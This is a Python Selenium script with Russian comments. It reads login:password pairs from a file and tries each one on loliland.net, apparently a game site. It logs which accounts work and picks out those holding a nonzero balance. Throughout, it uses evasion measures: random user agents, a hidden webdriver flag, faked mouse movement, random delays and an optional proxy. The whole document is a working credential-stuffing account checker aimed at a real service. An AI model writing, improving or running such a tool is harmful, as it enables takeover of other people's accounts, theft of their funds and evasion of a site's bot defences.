import random  # для генерации случайных чисел
from selenium import webdriver  # управление браузером
from selenium.webdriver.common.by import By  # поиск элементов HTML 
from selenium.webdriver.support import expected_conditions as EC  # ожидаемые условия
from selenium.webdriver.support.ui import WebDriverWait  # ожидания
import time  # для паузы в действиях
from fake_useragent import UserAgent 
from selenium.webdriver.common.action_chains import ActionChains


# Создаем экземпляр UserAgent
ua = UserAgent()

# Генерируем случайный пользовательский агент
random_user_agent = ua.random

# Настройки браузера
options = webdriver.ChromeOptions()
options.add_argument(f"user-agent={random_user_agent}")  # Устанавливаем случайный пользовательский агент
# options.add_argument("--headless")  # Закомментировать, если нужен видимый браузер
# для меньшего шанса обнаружения
options.add_argument("--disable-gpu")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--remote-debugging-port=9222")
#options.add_argument('--proxy-server=IP:PORT') использование прокси

# инициализация браузера с заданными настройками
driver = webdriver.Chrome(options=options)  
driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})") # 

# эмуляция движения мышки
action = ActionChains(driver)
action.move_by_offset(random.randint(100, 400), random.randint(100, 400)).perform()

# Файлы для входа и результатов
input_file = "accounts_check.txt"
output_file = "results.txt"
output_best_file = "money_results.txt"
 
cnt = 0

try:
    # Читаем логины и пароли из файла
    with open(input_file, "r") as file:
        accounts = file.readlines()

    results = []
    best_results = []

    # заходим на сайт
    driver.get("https://loliland.net/start")
    time.sleep(random.randint(15, 20))  # Случайная пауза от 15 до 20 секунд

    for account in accounts:
        cnt += 1
        login, password = account.strip().split(':')  # Разделяем логин и пароль
        print(f'🔄 Вход в аккаунт {login}:{password}   {cnt}/{len(accounts)}')

        # Находим поле логина (по placeholder)
        login_field = driver.find_element(By.XPATH, "//input[@placeholder='Логин']")
        login_field.clear()  # Очищаем поле логина
        login_field.send_keys(login)

        time.sleep(random.randint(3, 20))  # Случайная пауза от 3 до 20 секунд

        # Находим поле пароля (по placeholder)
        password_field = driver.find_element(By.XPATH, "//input[@placeholder='Пароль']")
        password_field.clear()  # Очищаем поле пароля
        password_field.send_keys(password)

        # Ищем кнопку входа (она внутри <div class="btn-drop">) и кликаем
        login_button = driver.find_element(By.CLASS_NAME, "btn-drop")
        login_button.click()

        time.sleep(random.randint(5, 20))  # Случайная пауза от 5 до 20 секунд

        # Проверяем успешный вход по наличию элемента с классом 'profile_div'
        try:
            profile_div = driver.find_element(By.CLASS_NAME, "profile_div")

            # Находим и нажимаем кнопку количества денег и "Выйти" 
            try:
                balance_element = driver.find_element(By.XPATH, "//div[contains(@class, 'badge green')]")
                balance = balance_element.text  # Получаем текст, который содержит баланс
                print(balance)
                if balance[0] != '0':
                    print(f"🔥🔥🔥 Успешный вход! {login}:{password} Баланс игрока: {balance}")  
                    best_results.append(f"🔥🔥🔥 Успешный вход! {login}:{password} Баланс игрока: {balance}") 
                else:
                    results.append(f"✅ Успешный вход! {login}:{password} Баланс игрока: {balance}") 
                    print(f"✅ Успешный вход! {login}:{password} Баланс игрока: {balance}")   

                # Ждем, пока кнопка "Выйти" станет доступной
                WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//div[contains(@class, 'button_profile') and contains(text(), 'Выйти')]")))
                logout_button = driver.find_element(By.XPATH, "//div[contains(@class, 'button_profile') and contains(text(), 'Выйти')]")
                logout_button.click()
                time.sleep(random.randint(15, 20))  # Пауза после выхода
            except Exception as e:
                print(f"❌ Не удалось выйти из аккаунта: {e}")

        except Exception as e:
            #results.append(f"❌ Ошибка входа! {login}:{password}")
            print(f"❌ Ошибка входа! {login}:{password}")

    # Записываем результаты в файл
    with open(output_file, "w") as file:
        for result in results:
            file.write(result + "\n")

    with open(output_best_file, "w") as file:
        for result in best_results:
            file.write(result + "\n")

finally:
    driver.quit()  # Закрываем браузер
    print("🏁 Проверка успешно завершена!")
